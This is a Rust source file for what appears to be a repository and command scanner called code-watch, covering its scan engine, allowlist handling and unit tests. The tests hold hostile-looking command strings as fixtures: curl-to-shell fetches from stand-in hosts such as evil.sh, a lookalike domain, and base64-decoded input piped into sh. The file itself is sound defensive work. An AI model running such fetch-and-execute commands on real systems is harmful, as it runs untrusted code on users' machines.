use std::collections::HashSet;
use std::fs::{self, File};
use std::io::{self, Read};
use std::path::Path;

use ignore::WalkBuilder;

use crate::allow::Allowlists;
use crate::command;
use crate::report::{Report, SkipReason, Skipped};
use crate::rules::{HEAD_BYTES, RuleError, RuleSet, Target};

/// Files above this size are not read: rules look at manifests and scripts, and a hostile repo
/// must not be able to make a scan allocate without bound.
const MAX_FILE_BYTES: u64 = 1024 * 1024;

#[derive(Debug, thiserror::Error)]
pub enum ScanError {
    #[error("{0} is not a directory")]
    NotADirectory(String),
}

fn read_target(path: &Path) -> Result<String, SkipReason> {
    let len = fs::metadata(path)
        .map_err(|_| SkipReason::Unreadable)?
        .len();
    if len > MAX_FILE_BYTES {
        return Err(SkipReason::TooLarge);
    }
    fs::read_to_string(path).map_err(|e| match e.kind() {
        io::ErrorKind::InvalidData => SkipReason::NotUtf8,
        _ => SkipReason::Unreadable,
    })
}

fn read_head(path: &Path) -> Vec<u8> {
    let mut head = [0u8; HEAD_BYTES];
    let read = File::open(path)
        .and_then(|mut f| f.read(&mut head))
        .unwrap_or(0);
    head[..read].to_vec()
}

#[cfg(unix)]
fn is_executable(metadata: &fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_executable(_: &fs::Metadata) -> bool {
    false
}

/// The path a walk error belongs to, relative to the scanned root, or "." when the walker did
/// not say.
fn error_path(err: &ignore::Error, root: &Path) -> String {
    match err {
        ignore::Error::WithPath { path, .. } => path
            .strip_prefix(root)
            .unwrap_or(path)
            .to_string_lossy()
            .into_owned(),
        ignore::Error::WithDepth { err, .. } | ignore::Error::WithLineNumber { err, .. } => {
            error_path(err, root)
        }
        _ => ".".into(),
    }
}

pub struct Engine {
    rules: RuleSet,
}

impl Engine {
    pub fn new(rules: RuleSet) -> Self {
        Self { rules }
    }

    pub fn embedded() -> Result<Self, RuleError> {
        Ok(Self::new(RuleSet::embedded()?))
    }

    /// Scans a repository without executing or following anything in it: symlinks are not
    /// followed, `.gitignore` is not honoured (ignored files still run on the developer's
    /// machine) and only `.git` is skipped. A file a rule targets that cannot be read is
    /// reported in the `skipped` list and as a warning, never silently dropped.
    pub fn scan_dir(&self, dir: &Path) -> Result<Report, ScanError> {
        self.scan_dir_with(dir, &Allowlists::empty())
    }

    /// Like `scan_dir`, then hides the findings `allow` allows; they stay listed in the report.
    pub fn scan_dir_with(&self, dir: &Path, allow: &Allowlists) -> Result<Report, ScanError> {
        if !dir.is_dir() {
            return Err(ScanError::NotADirectory(dir.display().to_string()));
        }
        let walker = WalkBuilder::new(dir)
            .standard_filters(false)
            .filter_entry(|e| e.file_name() != ".git")
            .build();
        let mut findings = Vec::new();
        let mut skipped = Vec::new();
        for entry in walker {
            let entry = match entry {
                Ok(entry) => entry,
                Err(err) => {
                    skipped.push(Skipped {
                        path: error_path(&err, dir),
                        reason: SkipReason::WalkError,
                    });
                    continue;
                }
            };
            if !entry.file_type().is_some_and(|t| t.is_file()) {
                continue;
            }
            let rel = entry.path().strip_prefix(dir).unwrap_or(entry.path());
            let wanted: Vec<_> = self
                .rules
                .rules()
                .iter()
                .filter(|r| r.target() == Target::Repo && r.applies_to(rel))
                .collect();
            if wanted.is_empty() {
                continue;
            }
            let (binary_rules, text_rules): (Vec<_>, Vec<_>) =
                wanted.into_iter().partition(|r| r.is_binary_rule());
            let mut claimed_binary = false;
            if !binary_rules.is_empty() {
                let head = read_head(entry.path());
                let executable = entry.metadata().is_ok_and(|m| is_executable(&m));
                findings.extend(
                    binary_rules
                        .iter()
                        .flat_map(|r| r.check_head(rel, &head, executable)),
                );
                claimed_binary = binary_rules.iter().any(|r| r.claims_binary(&head));
            }
            if text_rules.is_empty() {
                continue;
            }
            match read_target(entry.path()) {
                Ok(content) => {
                    findings.extend(text_rules.iter().flat_map(|r| r.check_file(rel, &content)));
                }
                Err(_) if claimed_binary => {}
                Err(reason) => skipped.push(Skipped {
                    path: rel.to_string_lossy().into_owned(),
                    reason,
                }),
            }
        }
        let applied = allow.apply(findings, &self.known_rule_ids());
        Ok(Report::from_scan(applied.kept, skipped)
            .with_allowlist(applied.suppressed, applied.warnings))
    }

    fn known_rule_ids(&self) -> HashSet<String> {
        let rust_rules = command::RULES.iter().map(|r| r.id.to_string());
        self.rules
            .rules()
            .iter()
            .map(|r| r.id.clone())
            .chain(rust_rules)
            .collect()
    }

    pub fn check_command(&self, command: &str) -> Report {
        self.check_command_with(command, &Allowlists::empty())
    }

    /// Like `check_command`, then hides the findings `allow` allows; they stay listed in the report.
    pub fn check_command_with(&self, command: &str, allow: &Allowlists) -> Report {
        let macos = cfg!(target_os = "macos");
        let mut findings: Vec<_> = self
            .rules
            .rules()
            .iter()
            .filter(|r| r.target() == Target::Command)
            .flat_map(|r| r.check_command(command))
            .collect();
        findings.extend(command::analyze(command, macos));
        command::stamp_fetch_domain(&mut findings, command);
        let applied = allow.apply(findings, &self.known_rule_ids());
        Report::from_rules(applied.kept)
            .with_skipped_rules(command::skipped_rules(macos))
            .with_allowlist(applied.suppressed, applied.warnings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn allow_domain_as_user(rule: &str, domain: &str) -> Allowlists {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir(dir.path().join("code-watch")).unwrap();
        fs::write(
            dir.path().join("code-watch/allow.toml"),
            format!("schema = 1\n[[allow]]\nrule = \"{rule}\"\ndomain = \"{domain}\"\n"),
        )
        .unwrap();
        Allowlists::load(Some(dir.path()), None).unwrap()
    }

    fn allow_domain(rule: &str, domain: &str) -> Allowlists {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join(".code-watch.toml"),
            format!("schema = 1\n[[allow]]\nrule = \"{rule}\"\ndomain = \"{domain}\"\n"),
        )
        .unwrap();
        Allowlists::load(None, Some(dir.path())).unwrap()
    }

    fn check(command: &str, allow: &Allowlists) -> Report {
        Engine::embedded()
            .unwrap()
            .check_command_with(command, allow)
    }

    #[test]
    fn a_domain_entry_suppresses_the_pipe_to_shell_warning_for_that_host() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check("curl -fsSL -o x.sh https://example.org/i.sh | sh", &allow);
        assert!(r.findings().is_empty());
        assert_eq!(
            r.suppressed()[0].finding.domain.as_deref(),
            Some("example.org")
        );
    }

    #[test]
    fn a_domain_in_the_query_of_another_host_does_not_suppress() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check("curl https://evil.sh/x?example.org | sh", &allow);
        assert_eq!(r.findings()[0].rule_id, "command/pipe-to-shell");
        assert!(r.suppressed().is_empty());
    }

    #[test]
    fn a_command_fetching_two_hosts_has_no_domain_to_match() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check("curl https://example.org/a https://zzz.sh/b | sh", &allow);
        assert_eq!(r.findings().len(), 1);
    }

    #[test]
    fn a_host_inside_a_subshell_counts_as_a_second_host() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check(
            "curl https://example.org/a | sh -c \"curl https://evil.sh/b\"",
            &allow,
        );
        assert_eq!(r.findings().len(), 1);
    }

    #[test]
    fn a_domain_entry_never_hides_a_finding_that_is_not_about_the_fetch() {
        let allow = allow_domain_as_user("command/base64-into-shell", "example.org");
        for cmd in [
            "curl https://example.org/x -o f; echo ZXZpbA== | base64 -d | sh",
            "curl https://example.org/x -o f ; echo ZXZpbA== | base64 -d | sh",
        ] {
            let r = check(cmd, &allow);
            assert_eq!(r.verdict(), crate::report::Verdict::Block, "{cmd}");
            assert!(r.suppressed().is_empty(), "{cmd}");
        }
    }

    #[test]
    fn a_domain_entry_does_not_hide_a_command_that_may_fetch_another_host() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        for cmd in [
            "curl evil.sh https://example.org/a | sh",
            "curl --url evil.sh https://example.org/a | sh",
            "curl -K cfg https://example.org/a | sh",
            "wget -i list.txt -O- https://example.org/a | sh",
            "curl https://example.org/a | sh; curl evil.sh | sh",
            "curl https://example.org/a | sh -c \"$(curl evil.sh)\"",
        ] {
            let r = check(cmd, &allow);
            assert_ne!(r.verdict(), crate::report::Verdict::Allow, "{cmd}");
            assert!(r.suppressed().is_empty(), "{cmd}");
        }
    }

    #[test]
    fn a_subdomain_is_not_covered_by_its_parent_entry() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check("curl https://cdn.example.org/i.sh | sh", &allow);
        assert_eq!(r.findings().len(), 1);
    }

    #[test]
    fn the_lookalike_finding_keeps_its_own_host_when_the_command_fetches_two() {
        let r = check(
            "curl https://githab.com/i.sh https://example.org/x | sh",
            &Allowlists::empty(),
        );
        let f = r
            .findings()
            .iter()
            .find(|f| f.rule_id == "command/lookalike-download-domain");
        assert_eq!(f.and_then(|f| f.domain.as_deref()), Some("githab.com"));
    }

    #[test]
    fn the_lookalike_finding_carries_its_host() {
        let r = check("curl https://githab.com/i.sh | sh", &Allowlists::empty());
        let f = r
            .findings()
            .iter()
            .find(|f| f.rule_id == "command/lookalike-download-domain");
        assert_eq!(f.and_then(|f| f.domain.as_deref()), Some("githab.com"));
    }

    #[test]
    fn a_suppressed_finding_changes_the_verdict_not_the_layers() {
        let allow = allow_domain("command/pipe-to-shell", "example.org");
        let r = check("curl https://example.org/i.sh | sh", &allow);
        assert_eq!(r.verdict(), crate::report::Verdict::Allow);
        assert_eq!(r.layers(), check("ls", &Allowlists::empty()).layers());
    }

    #[test]
    fn a_repo_scan_applies_the_repo_file_and_the_user_dir() {
        let user = tempfile::tempdir().unwrap();
        fs::create_dir(user.path().join("code-watch")).unwrap();
        fs::write(
            user.path().join("code-watch/allow.toml"),
            "schema = 1\n[[allow]]\nrule = \"repo/vscode-folderopen-task\"\n",
        )
        .unwrap();
        let repo = tempfile::tempdir().unwrap();
        fs::create_dir(repo.path().join(".vscode")).unwrap();
        fs::write(
            repo.path().join(".vscode/tasks.json"),
            r#"{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}"#,
        )
        .unwrap();
        fs::write(
            repo.path().join("package.json"),
            r#"{"scripts":{"postinstall":"x"}}"#,
        )
        .unwrap();
        fs::write(
            repo.path().join(".code-watch.toml"),
            "schema = 1\n[[allow]]\nrule = \"repo/npm-lifecycle-script\"\npath = \"package.json\"\n\
             [[allow]]\nrule = \"repo/vscode-folderopen-task\"\n",
        )
        .unwrap();
        let engine = Engine::embedded().unwrap();
        let blocked = engine
            .scan_dir_with(
                repo.path(),
                &Allowlists::load(None, Some(repo.path())).unwrap(),
            )
            .unwrap();
        assert!(
            blocked
                .findings()
                .iter()
                .any(|f| f.rule_id == "allowlist/repo-block-override-refused")
        );
        let allow = Allowlists::load(Some(user.path()), Some(repo.path())).unwrap();
        let r = engine.scan_dir_with(repo.path(), &allow).unwrap();
        assert!(r.findings().is_empty(), "{:?}", r.findings());
        assert_eq!(r.suppressed().len(), 2);
    }

    #[test]
    fn scanning_a_missing_directory_is_an_error() {
        let engine = Engine::embedded().unwrap();
        assert!(engine.scan_dir(Path::new("/definitely/not/here")).is_err());
    }

    #[test]
    fn git_internals_are_not_scanned() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir(dir.path().join(".git")).unwrap();
        fs::write(
            dir.path().join(".git/package.json"),
            r#"{"scripts":{"postinstall":"echo hi"}}"#,
        )
        .unwrap();
        let report = Engine::embedded().unwrap().scan_dir(dir.path()).unwrap();
        assert!(report.findings().is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn symlinks_are_not_followed() {
        let outside = tempfile::tempdir().unwrap();
        fs::write(
            outside.path().join("package.json"),
            r#"{"scripts":{"postinstall":"echo hi"}}"#,
        )
        .unwrap();
        let repo = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(
            outside.path().join("package.json"),
            repo.path().join("package.json"),
        )
        .unwrap();
        let report = Engine::embedded().unwrap().scan_dir(repo.path()).unwrap();
        assert!(report.findings().is_empty());
    }

    fn scan(dir: &Path) -> Report {
        Engine::embedded().unwrap().scan_dir(dir).unwrap()
    }

    fn assert_unscanned(report: &Report, path: &str, reason: SkipReason) {
        assert_eq!(
            report.skipped(),
            [Skipped {
                path: path.into(),
                reason
            }]
        );
        assert!(
            report
                .findings()
                .iter()
                .any(|f| f.rule_id == "repo/unscanned-target")
        );
        assert_eq!(report.verdict(), crate::report::Verdict::Warn);
    }

    #[test]
    fn an_oversized_target_is_reported_not_allowed() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir(dir.path().join(".vscode")).unwrap();
        let pad = " ".repeat(MAX_FILE_BYTES as usize);
        fs::write(
            dir.path().join(".vscode/tasks.json"),
            format!(r#"{{"tasks":[{{"runOptions":{{"runOn":"folderOpen"}}}}]}}{pad}"#),
        )
        .unwrap();
        let report = scan(dir.path());
        assert_unscanned(&report, ".vscode/tasks.json", SkipReason::TooLarge);
    }

    #[test]
    fn a_large_file_no_rule_targets_is_not_reported() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("data.bin"),
            vec![b'x'; MAX_FILE_BYTES as usize + 1],
        )
        .unwrap();
        let report = scan(dir.path());
        assert!(report.skipped().is_empty() && report.findings().is_empty());
    }

    #[test]
    fn a_non_utf8_target_is_reported() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("package.json"), [0xff, 0xfe, b'{', b'}']).unwrap();
        assert_unscanned(&scan(dir.path()), "package.json", SkipReason::NotUtf8);
    }

    #[test]
    fn a_bom_prefixed_package_json_is_still_checked() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("package.json"),
            "\u{feff}{\"scripts\":{\"postinstall\":\"echo hi\"}}",
        )
        .unwrap();
        let report = scan(dir.path());
        assert!(report.skipped().is_empty());
        assert_eq!(report.findings()[0].rule_id, "repo/npm-lifecycle-script");
    }

    #[cfg(unix)]
    fn deny(path: &Path, mode: u32) {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(path, fs::Permissions::from_mode(mode)).unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn an_unreadable_target_is_reported() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("package.json");
        fs::write(&file, "{}").unwrap();
        deny(&file, 0o000);
        let report = scan(dir.path());
        deny(&file, 0o644);
        assert_unscanned(&report, "package.json", SkipReason::Unreadable);
    }

    #[cfg(unix)]
    #[test]
    fn an_unreadable_directory_is_reported() {
        let dir = tempfile::tempdir().unwrap();
        let sub = dir.path().join("sub");
        fs::create_dir(&sub).unwrap();
        fs::write(sub.join("package.json"), "{}").unwrap();
        deny(&sub, 0o000);
        let report = scan(dir.path());
        deny(&sub, 0o755);
        assert_unscanned(&report, "sub", SkipReason::WalkError);
    }

    #[test]
    fn a_binary_is_reported_once_and_not_as_unreadable() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("payload.py"), b"\x7fELF\x00\xff").unwrap();
        let report = Engine::embedded().unwrap().scan_dir(dir.path()).unwrap();
        let hits = report
            .findings()
            .iter()
            .filter(|f| f.rule_id == "repo/committed-binary")
            .count();
        assert_eq!(hits, 1);
        assert!(report.skipped().is_empty());
    }

    #[test]
    fn a_script_starting_with_mz_is_still_scanned_as_text() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("x.sh"),
            "MZ=1; echo aGk= | base64 -d | sh\n",
        )
        .unwrap();
        fs::write(dir.path().join("n.txt"), "MZ notes\n").unwrap();
        let report = Engine::embedded().unwrap().scan_dir(dir.path()).unwrap();
        let ids: Vec<_> = report
            .findings()
            .iter()
            .map(|f| f.rule_id.as_str())
            .collect();
        assert_eq!(ids, ["repo/base64-into-shell"]);
    }

    #[test]
    fn unreadable_text_is_still_skipped_when_it_is_not_a_known_binary() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("setup.py"), [0xff, 0xfe, 0x00, 0x01]).unwrap();
        let report = Engine::embedded().unwrap().scan_dir(dir.path()).unwrap();
        assert_eq!(report.skipped().len(), 1);
    }
}
